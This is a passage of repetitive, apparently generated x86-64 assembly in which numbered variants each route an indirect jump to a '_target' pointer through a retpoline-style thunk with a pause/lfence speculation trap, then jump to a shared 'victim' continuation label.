	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000052
	jmp	.Lgg_retpol_after_000052
.Lgg_retpol_thunk_000052:
	callq	.Lgg_retpol_setup_000052
.Lgg_retpol_cap_000052:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000052
.Lgg_retpol_setup_000052:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000052:
	jmp	.Lvictim_win0_continue
## Variant 53
.Lvictim_win0_var53:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000053
	jmp	.Lgg_retpol_after_000053
.Lgg_retpol_thunk_000053:
	callq	.Lgg_retpol_setup_000053
.Lgg_retpol_cap_000053:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000053
.Lgg_retpol_setup_000053:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000053:
	jmp	.Lvictim_win0_continue
## Variant 54
.Lvictim_win0_var54:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000054
	jmp	.Lgg_retpol_after_000054
.Lgg_retpol_thunk_000054:
	callq	.Lgg_retpol_setup_000054
.Lgg_retpol_cap_000054:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000054
.Lgg_retpol_setup_000054:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000054:
	jmp	.Lvictim_win0_continue
## Variant 55
.Lvictim_win0_var55:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000055
	jmp	.Lgg_retpol_after_000055
.Lgg_retpol_thunk_000055:
	callq	.Lgg_retpol_setup_000055
.Lgg_retpol_cap_000055:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000055
.Lgg_retpol_setup_000055:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000055:
	jmp	.Lvictim_win0_continue
## Variant 56
.Lvictim_win0_var56:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000056
	jmp	.Lgg_retpol_after_000056
.Lgg_retpol_thunk_000056:
	callq	.Lgg_retpol_setup_000056
.Lgg_retpol_cap_000056:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000056
.Lgg_retpol_setup_000056:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000056:
	jmp	.Lvictim_win0_continue
## Variant 57
.Lvictim_win0_var57:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000057
	jmp	.Lgg_retpol_after_000057
.Lgg_retpol_thunk_000057:
	callq	.Lgg_retpol_setup_000057
.Lgg_retpol_cap_000057:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000057
.Lgg_retpol_setup_000057:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000057:
	jmp	.Lvictim_win0_continue
## Variant 58
.Lvictim_win0_var58:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000058
	jmp	.Lgg_retpol_after_000058
.Lgg_retpol_thunk_000058:
	callq	.Lgg_retpol_setup_000058
.Lgg_retpol_cap_000058:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000058
.Lgg_retpol_setup_000058:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000058:
	jmp	.Lvictim_win0_continue
## Variant 59
.Lvictim_win0_var59:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000059
	jmp	.Lgg_retpol_after_000059
.Lgg_retpol_thunk_000059:
	callq	.Lgg_retpol_setup_000059
.Lgg_retpol_cap_000059:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000059
.Lgg_retpol_setup_000059:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000059:
	jmp	.Lvictim_win0_continue
## Variant 60
.Lvictim_win0_var60:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000060
	jmp	.Lgg_retpol_after_000060
.Lgg_retpol_thunk_000060:
	callq	.Lgg_retpol_setup_000060
.Lgg_retpol_cap_000060:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000060
.Lgg_retpol_setup_000060:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000060:
	jmp	.Lvictim_win0_continue
## Variant 61
.Lvictim_win0_var61:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000061
	jmp	.Lgg_retpol_after_000061
.Lgg_retpol_thunk_000061:
	callq	.Lgg_retpol_setup_000061
.Lgg_retpol_cap_000061:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000061
.Lgg_retpol_setup_000061:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000061:
	jmp	.Lvictim_win0_continue
## Variant 62
.Lvictim_win0_var62:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000062
	jmp	.Lgg_retpol_after_000062
.Lgg_retpol_thunk_000062:
	callq	.Lgg_retpol_setup_000062
.Lgg_retpol_cap_000062:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000062
.Lgg_retpol_setup_000062:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000062:
	jmp	.Lvictim_win0_continue
## Variant 63
.Lvictim_win0_var63:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000063
	jmp	.Lgg_retpol_after_000063
.Lgg_retpol_thunk_000063:
	callq	.Lgg_retpol_setup_000063
.Lgg_retpol_cap_000063:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000063
.Lgg_retpol_setup_000063:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000063:
	jmp	.Lvictim_win0_continue
## Variant 64
.Lvictim_win0_var64:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000064
	jmp	.Lgg_retpol_after_000064
.Lgg_retpol_thunk_000064:
	callq	.Lgg_retpol_setup_000064
.Lgg_retpol_cap_000064:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000064
.Lgg_retpol_setup_000064:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000064:
	jmp	.Lvictim_win0_continue
## Variant 65
.Lvictim_win0_var65:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000065
	jmp	.Lgg_retpol_after_000065
.Lgg_retpol_thunk_000065:
	callq	.Lgg_retpol_setup_000065
.Lgg_retpol_cap_000065:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000065
.Lgg_retpol_setup_000065:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000065:
	jmp	.Lvictim_win0_continue
## Variant 66
.Lvictim_win0_var66:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000066
	jmp	.Lgg_retpol_after_000066
.Lgg_retpol_thunk_000066:
	callq	.Lgg_retpol_setup_000066
.Lgg_retpol_cap_000066:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000066
.Lgg_retpol_setup_000066:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000066:
	jmp	.Lvictim_win0_continue
## Variant 67
.Lvictim_win0_var67:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000067
	jmp	.Lgg_retpol_after_000067
.Lgg_retpol_thunk_000067:
	callq	.Lgg_retpol_setup_000067
.Lgg_retpol_cap_000067:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000067
.Lgg_retpol_setup_000067:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000067:
	jmp	.Lvictim_win0_continue
## Variant 68
.Lvictim_win0_var68:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000068
	jmp	.Lgg_retpol_after_000068
.Lgg_retpol_thunk_000068:
	callq	.Lgg_retpol_setup_000068
.Lgg_retpol_cap_000068:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000068
.Lgg_retpol_setup_000068:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000068:
	jmp	.Lvictim_win0_continue
## Variant 69
.Lvictim_win0_var69:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000069
	jmp	.Lgg_retpol_after_000069
.Lgg_retpol_thunk_000069:
	callq	.Lgg_retpol_setup_000069
.Lgg_retpol_cap_000069:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000069
.Lgg_retpol_setup_000069:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000069:
	jmp	.Lvictim_win0_continue
## Variant 70
.Lvictim_win0_var70:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000070
	jmp	.Lgg_retpol_after_000070
.Lgg_retpol_thunk_000070:
	callq	.Lgg_retpol_setup_000070
.Lgg_retpol_cap_000070:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000070
.Lgg_retpol_setup_000070:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000070:
	jmp	.Lvictim_win0_continue
## Variant 71
.Lvictim_win0_var71:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000071
	jmp	.Lgg_retpol_after_000071
.Lgg_retpol_thunk_000071:
	callq	.Lgg_retpol_setup_000071
.Lgg_retpol_cap_000071:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000071
.Lgg_retpol_setup_000071:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000071:
	jmp	.Lvictim_win0_continue
## Variant 72
.Lvictim_win0_var72:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000072
	jmp	.Lgg_retpol_after_000072
.Lgg_retpol_thunk_000072:
	callq	.Lgg_retpol_setup_000072
.Lgg_retpol_cap_000072:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000072
.Lgg_retpol_setup_000072:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000072:
	jmp	.Lvictim_win0_continue
## Variant 73
.Lvictim_win0_var73:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000073
	jmp	.Lgg_retpol_after_000073
.Lgg_retpol_thunk_000073:
	callq	.Lgg_retpol_setup_000073
.Lgg_retpol_cap_000073:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000073
.Lgg_retpol_setup_000073:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000073:
	jmp	.Lvictim_win0_continue
## Variant 74
.Lvictim_win0_var74:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000074
	jmp	.Lgg_retpol_after_000074
.Lgg_retpol_thunk_000074:
	callq	.Lgg_retpol_setup_000074
.Lgg_retpol_cap_000074:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000074
.Lgg_retpol_setup_000074:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000074:
	jmp	.Lvictim_win0_continue
## Variant 75
.Lvictim_win0_var75:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000075
	jmp	.Lgg_retpol_after_000075
.Lgg_retpol_thunk_000075:
	callq	.Lgg_retpol_setup_000075
.Lgg_retpol_cap_000075:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000075
.Lgg_retpol_setup_000075:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000075:
	jmp	.Lvictim_win0_continue
## Variant 76
.Lvictim_win0_var76:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000076
	jmp	.Lgg_retpol_after_000076
.Lgg_retpol_thunk_000076:
	callq	.Lgg_retpol_setup_000076
.Lgg_retpol_cap_000076:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000076
.Lgg_retpol_setup_000076:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000076:
	jmp	.Lvictim_win0_continue
## Variant 77
.Lvictim_win0_var77:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000077
	jmp	.Lgg_retpol_after_000077
.Lgg_retpol_thunk_000077:
	callq	.Lgg_retpol_setup_000077
.Lgg_retpol_cap_000077:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000077
.Lgg_retpol_setup_000077:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000077:
	jmp	.Lvictim_win0_continue
## Variant 78
.Lvictim_win0_var78:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000078
	jmp	.Lgg_retpol_after_000078
.Lgg_retpol_thunk_000078:
	callq	.Lgg_retpol_setup_000078
.Lgg_retpol_cap_000078:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000078
.Lgg_retpol_setup_000078:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000078:
	jmp	.Lvictim_win0_continue
## Variant 79
.Lvictim_win0_var79:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000079
	jmp	.Lgg_retpol_after_000079
.Lgg_retpol_thunk_000079:
	callq	.Lgg_retpol_setup_000079
.Lgg_retpol_cap_000079:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000079
.Lgg_retpol_setup_000079:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000079:
	jmp	.Lvictim_win0_continue
## Variant 80
.Lvictim_win0_var80:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000080
	jmp	.Lgg_retpol_after_000080
.Lgg_retpol_thunk_000080:
	callq	.Lgg_retpol_setup_000080
.Lgg_retpol_cap_000080:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000080
.Lgg_retpol_setup_000080:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000080:
	jmp	.Lvictim_win0_continue
## Variant 81
.Lvictim_win0_var81:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000081
	jmp	.Lgg_retpol_after_000081
.Lgg_retpol_thunk_000081:
	callq	.Lgg_retpol_setup_000081
.Lgg_retpol_cap_000081:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000081
.Lgg_retpol_setup_000081:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000081:
	jmp	.Lvictim_win0_continue
## Variant 82
.Lvictim_win0_var82:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000082
	jmp	.Lgg_retpol_after_000082
.Lgg_retpol_thunk_000082:
	callq	.Lgg_retpol_setup_000082
.Lgg_retpol_cap_000082:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000082
.Lgg_retpol_setup_000082:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000082:
	jmp	.Lvictim_win0_continue
## Variant 83
.Lvictim_win0_var83:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000083
	jmp	.Lgg_retpol_after_000083
.Lgg_retpol_thunk_000083:
	callq	.Lgg_retpol_setup_000083
.Lgg_retpol_cap_000083:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000083
.Lgg_retpol_setup_000083:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000083:
	jmp	.Lvictim_win0_continue
## Variant 84
.Lvictim_win0_var84:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000084
	jmp	.Lgg_retpol_after_000084
.Lgg_retpol_thunk_000084:
	callq	.Lgg_retpol_setup_000084
.Lgg_retpol_cap_000084:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000084
.Lgg_retpol_setup_000084:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000084:
	jmp	.Lvictim_win0_continue
## Variant 85
.Lvictim_win0_var85:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000085
	jmp	.Lgg_retpol_after_000085
.Lgg_retpol_thunk_000085:
	callq	.Lgg_retpol_setup_000085
.Lgg_retpol_cap_000085:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000085
.Lgg_retpol_setup_000085:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000085:
	jmp	.Lvictim_win0_continue
## Variant 86
.Lvictim_win0_var86:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000086
	jmp	.Lgg_retpol_after_000086
.Lgg_retpol_thunk_000086:
	callq	.Lgg_retpol_setup_000086
.Lgg_retpol_cap_000086:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000086
.Lgg_retpol_setup_000086:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000086:
	jmp	.Lvictim_win0_continue
## Variant 87
.Lvictim_win0_var87:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000087
	jmp	.Lgg_retpol_after_000087
.Lgg_retpol_thunk_000087:
	callq	.Lgg_retpol_setup_000087
.Lgg_retpol_cap_000087:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000087
.Lgg_retpol_setup_000087:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000087:
	jmp	.Lvictim_win0_continue
## Variant 88
.Lvictim_win0_var88:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000088
	jmp	.Lgg_retpol_after_000088
.Lgg_retpol_thunk_000088:
	callq	.Lgg_retpol_setup_000088
.Lgg_retpol_cap_000088:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000088
.Lgg_retpol_setup_000088:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000088:
	jmp	.Lvictim_win0_continue
## Variant 89
.Lvictim_win0_var89:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000089
	jmp	.Lgg_retpol_after_000089
.Lgg_retpol_thunk_000089:
	callq	.Lgg_retpol_setup_000089
.Lgg_retpol_cap_000089:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000089
.Lgg_retpol_setup_000089:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000089:
	jmp	.Lvictim_win0_continue
## Variant 90
.Lvictim_win0_var90:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000090
	jmp	.Lgg_retpol_after_000090
.Lgg_retpol_thunk_000090:
	callq	.Lgg_retpol_setup_000090
.Lgg_retpol_cap_000090:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000090
.Lgg_retpol_setup_000090:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000090:
	jmp	.Lvictim_win0_continue
## Variant 91
.Lvictim_win0_var91:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000091
	jmp	.Lgg_retpol_after_000091
.Lgg_retpol_thunk_000091:
	callq	.Lgg_retpol_setup_000091
.Lgg_retpol_cap_000091:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000091
.Lgg_retpol_setup_000091:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000091:
	jmp	.Lvictim_win0_continue
## Variant 92
.Lvictim_win0_var92:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000092
	jmp	.Lgg_retpol_after_000092
.Lgg_retpol_thunk_000092:
	callq	.Lgg_retpol_setup_000092
.Lgg_retpol_cap_000092:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000092
.Lgg_retpol_setup_000092:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000092:
	jmp	.Lvictim_win0_continue
## Variant 93
.Lvictim_win0_var93:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000093
	jmp	.Lgg_retpol_after_000093
.Lgg_retpol_thunk_000093:
	callq	.Lgg_retpol_setup_000093
.Lgg_retpol_cap_000093:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000093
.Lgg_retpol_setup_000093:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000093:
	jmp	.Lvictim_win0_continue
## Variant 94
.Lvictim_win0_var94:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000094
	jmp	.Lgg_retpol_after_000094
.Lgg_retpol_thunk_000094:
	callq	.Lgg_retpol_setup_000094
.Lgg_retpol_cap_000094:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000094
.Lgg_retpol_setup_000094:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000094:
	jmp	.Lvictim_win0_continue
## Variant 95
.Lvictim_win0_var95:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000095
	jmp	.Lgg_retpol_after_000095
.Lgg_retpol_thunk_000095:
	callq	.Lgg_retpol_setup_000095
.Lgg_retpol_cap_000095:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000095
.Lgg_retpol_setup_000095:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000095:
	jmp	.Lvictim_win0_continue
## Variant 96
.Lvictim_win0_var96:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000096
	jmp	.Lgg_retpol_after_000096
.Lgg_retpol_thunk_000096:
	callq	.Lgg_retpol_setup_000096
.Lgg_retpol_cap_000096:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000096
.Lgg_retpol_setup_000096:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000096:
	jmp	.Lvictim_win0_continue
## Variant 97
.Lvictim_win0_var97:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000097
	jmp	.Lgg_retpol_after_000097
.Lgg_retpol_thunk_000097:
	callq	.Lgg_retpol_setup_000097
.Lgg_retpol_cap_000097:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000097
.Lgg_retpol_setup_000097:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000097:
	jmp	.Lvictim_win0_continue
## Variant 98
.Lvictim_win0_var98:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000098
	jmp	.Lgg_retpol_after_000098
.Lgg_retpol_thunk_000098:
	callq	.Lgg_retpol_setup_000098
.Lgg_retpol_cap_000098:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000098
.Lgg_retpol_setup_000098:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000098:
	jmp	.Lvictim_win0_continue
## Variant 99
.Lvictim_win0_var99:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000099
	jmp	.Lgg_retpol_after_000099
.Lgg_retpol_thunk_000099:
	callq	.Lgg_retpol_setup_000099
.Lgg_retpol_cap_000099:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000099
.Lgg_retpol_setup_000099:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000099:
	jmp	.Lvictim_win0_continue
## Variant 100
.Lvictim_win0_var100:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000100
	jmp	.Lgg_retpol_after_000100
.Lgg_retpol_thunk_000100:
	callq	.Lgg_retpol_setup_000100
.Lgg_retpol_cap_000100:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000100
.Lgg_retpol_setup_000100:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000100:
	jmp	.Lvictim_win0_continue
## Variant 101
.Lvictim_win0_var101:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000101
	jmp	.Lgg_retpol_after_000101
.Lgg_retpol_thunk_000101:
	callq	.Lgg_retpol_setup_000101
.Lgg_retpol_cap_000101:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000101
.Lgg_retpol_setup_000101:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000101:
	jmp	.Lvictim_win0_continue
## Variant 102
.Lvictim_win0_var102:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000102
	jmp	.Lgg_retpol_after_000102
.Lgg_retpol_thunk_000102:
	callq	.Lgg_retpol_setup_000102
.Lgg_retpol_cap_000102:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000102
.Lgg_retpol_setup_000102:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000102:
	jmp	.Lvictim_win0_continue
## Variant 103
.Lvictim_win0_var103:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000103
	jmp	.Lgg_retpol_after_000103
.Lgg_retpol_thunk_000103:
	callq	.Lgg_retpol_setup_000103
.Lgg_retpol_cap_000103:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000103
.Lgg_retpol_setup_000103:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000103:
	jmp	.Lvictim_win0_continue
## Variant 104
.Lvictim_win0_var104:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
